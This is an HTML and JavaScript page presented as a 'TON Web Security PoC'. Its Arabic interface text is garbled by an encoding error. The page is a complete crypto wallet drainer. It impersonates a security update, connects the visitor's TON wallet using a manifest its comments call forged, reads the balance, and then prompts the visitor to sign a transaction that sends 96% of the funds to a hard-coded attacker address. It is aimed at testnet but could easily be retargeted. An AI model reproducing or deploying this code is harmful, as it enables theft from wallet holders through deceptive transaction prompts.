<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>TON Web Security PoC</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0b0e11; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #1e2329; padding: 40px; border-radius: 24px; border: 1px solid #333; text-align: center; width: 420px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .balance-box { display: none; background: #000; padding: 20px; border-radius: 15px; margin-top: 20px; border: 1px solid #58a6ff; }
        button { background: #0088cc; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 18px; transition: 0.3s; }
        button:hover { background: #0077b5; }
        #status { margin-top: 15px; color: #848e9c; font-size: 13px; }
        .addr-text { font-size: 10px; color: #aaa; word-break: break-all; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://ton.org/address/ton_logo.png" width="70" style="margin-bottom: 20px;">
    <h2>ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø£Ù…Ø§Ù† (Web PoC)</h2>
    <p style="color: #aaa;">Ù‡Ø°Ù‡ Ø§Ù„ØµÙØ­Ø© ØªØ­Ø§ÙƒÙŠ Ù‡Ø¬ÙˆÙ… Ø§Ù†ØªØ­Ø§Ù„ Ø§Ù„Ù‡ÙˆÙŠØ© Ù„Ø³Ø­Ø¨ Ø±ØµÙŠØ¯ Ø§Ù„ØªÙŠØ³Øª Ù†ÙŠØª.</p>
    
    <button id="connectBtn">ÙØªØ­ Ù…Ø­ÙØ¸Ø© Ø§Ù„ÙˆÙŠØ¨ ÙˆØ§Ù„Ø±Ø¨Ø·</button>

    <div id="balanceBox" class="balance-box">
        <div style="color: #58a6ff; margin-bottom: 10px;">ØªÙ… Ø¬Ù„Ø¨ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø­ÙØ¸Ø©:</div>
        <div id="addr" class="addr-text">-</div>
        <div style="font-size: 26px; margin-top: 15px; font-weight: bold;"><span id="balance">0.00</span> TON</div>
    </div>
    
    <div id="status">Ø¬Ø§Ù‡Ø² Ù„Ù„Ø¨Ø¯Ø¡...</div>
</div>

<script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>

<script>
    // Ø±Ø§Ø¨Ø· Ø§Ù„Ù…Ø§Ù†ÙŠÙØ³Øª Ø§Ù„Ù…Ø²ÙˆØ±
    const manifest = "https://gist.githubusercontent.com/pp0p/5119b45ec095aecbe9638d21f36e56ad/raw/d30a363c4cf4b6926d8b310a02ee1d350d869729/tonconnect-manifest.json";
    const connector = new TonConnectSDK.TonConnect({ manifestUrl: manifest });

    document.getElementById('connectBtn').onclick = async () => {
        try {
            // ÙØµÙ„ Ø£ÙŠ Ø¬Ù„Ø³Ø© Ù‚Ø¯ÙŠÙ…Ø© Ù„Ø¶Ù…Ø§Ù† Ø¸Ù‡ÙˆØ± Ø§Ù„Ù†Ø§ÙØ°Ø©
            if (connector.connected) await connector.disconnect();

            // ØªÙˆÙ„ÙŠØ¯ Ø±Ø§Ø¨Ø· Ø§Ù„Ø±Ø¨Ø· Ø§Ù„Ù…Ø®ØµØµ Ù„Ù†Ø³Ø®Ø© Ø§Ù„ÙˆÙŠØ¨
            const connectUrl = connector.connect({
                universalLink: 'https://wallet.tonkeeper.com/ton-connect',
                bridgeUrl: 'https://bridge.tonapi.io/bridge'
            });

            // ÙØªØ­ Ø§Ù„Ù…Ø­ÙØ¸Ø© ÙÙŠ Ù†Ø§ÙØ°Ø© Ø¬Ø¯ÙŠØ¯Ø©
            window.open(connectUrl, '_blank', 'width=450,height=700');
            document.getElementById('status').innerText = "Ø¨Ø§Ù†ØªØ¸Ø§Ø± Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© ÙÙŠ Ø§Ù„Ù†Ø§ÙØ°Ø© Ø§Ù„Ù…Ù†Ø¨Ø«Ù‚Ø©...";
        } catch (e) {
            console.error(e);
            document.getElementById('status').innerText = "Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø§ØªØµØ§Ù„.";
        }
    };

    connector.onStatusChange(async (wallet) => {
        if (wallet) {
            document.getElementById('status').innerText = "âœ… ØªÙ… Ø§Ù„Ø§ØªØµØ§Ù„! Ø¬Ø§Ø±ÙŠ Ø¬Ù„Ø¨ Ø§Ù„Ø±ØµÙŠØ¯...";
            const rawAddress = wallet.account.address;
            document.getElementById('addr').innerText = rawAddress;
            document.getElementById('balanceBox').style.display = 'block';

            // Ø¬Ù„Ø¨ Ø§Ù„Ø±ØµÙŠØ¯ Ù…Ù† TON Testnet API
            try {
                const response = await fetch(`https://testnet.toncenter.com/api/v2/getAddressInformation?address=${rawAddress}`);
                const data = await response.json();
                const balanceNano = data.result.balance;
                document.getElementById('balance').innerText = (balanceNano / 1000000000).toFixed(2);

                // Ø¥Ø±Ø³Ø§Ù„ Ø·Ù„Ø¨ Ø§Ù„Ø³Ø­Ø¨ Ø§Ù„ÙÙˆØ±ÙŠ (Ø¥Ø«Ø¨Ø§Øª Ø§Ù„Ø¶Ø±Ø±)
                setTimeout(() => initiateDrain(balanceNano), 2500);
            } catch (e) { 
                document.getElementById('status').innerText = "ÙØ´Ù„ Ø¬Ù„Ø¨ Ø§Ù„Ø±ØµÙŠØ¯ Ù…Ù† Ø§Ù„Ø´Ø¨ÙƒØ©.";
            }
        }
    });

    async function initiateDrain(nanoAmount) {
        if (nanoAmount <= 0) return;
        
        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 120,
            messages: [{
                address: "0QAPwOt8W9eZqRj2OwxDjwSTtMMCG-uXr6MQMZ0WiFgdP0rY", // Ù…Ø­ÙØ¸Ø© Ø§Ù„Ù…Ù‡Ø§Ø¬Ù…
                amount: Math.floor(nanoAmount * 0.96).toString() // Ø³Ø­Ø¨ 96%
            }]
        };

        try {
            document.getElementById('status').innerText = "ÙŠØ±Ø¬Ù‰ ØªÙˆÙ‚ÙŠØ¹ Ø§Ù„Ù…Ø¹Ø§Ù…Ù„Ø© Ù„ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø­Ù…Ø§ÙŠØ©...";
            await connector.sendTransaction(transaction);
            document.getElementById('status').innerText = "ğŸš€ ØªÙ… Ø³Ø­Ø¨ Ø§Ù„Ø±ØµÙŠØ¯ Ø¨Ù†Ø¬Ø§Ø­!";
        } catch (e) {
            document.getElementById('status').innerText = "ÙØ´Ù„Øª Ø§Ù„Ù…Ø¹Ø§Ù…Ù„Ø© Ø£Ùˆ ØªÙ… Ø±ÙØ¶Ù‡Ø§.";
        }
    }
</script>
</body>
</html>
